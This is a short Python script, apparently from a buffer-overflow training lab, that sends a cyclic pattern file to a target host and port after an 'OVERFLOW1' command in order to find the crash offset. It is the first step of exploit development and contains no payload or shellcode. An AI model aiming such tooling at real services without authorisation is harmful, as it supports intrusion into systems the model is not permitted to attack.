#!/usr/bin/python3

import socket, sys
from time import sleep


def check_args():
	try:
		host = sys.argv[1]
		port = sys.argv[2]
		pattern = sys.argv[3]
	except:
		print("Usage: offset.py [host] [port] [pattern_file]")
		sys.exit()


def read_pattern(file):
	try:
		with open(file, 'r') as f:
			pattern = f.read()

		return pattern.strip()

	except FileNotFoundError as E:
		print(E)
		sys.exit()


def find_offset(host, port, pattern_file):
	
			try:
				s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))

				s.send(("OVERFLOW1 " + pattern_file).encode('utf-8'))
				s.close()

			except Exception as E:
				print(E)
				print("error.. unable to connect")
				sys.exit()

if __name__ == '__main__':
	check_args()
	file = read_pattern(str(sys.argv[3]))
	find_offset(str(sys.argv[1]), int(sys.argv[2]), file)
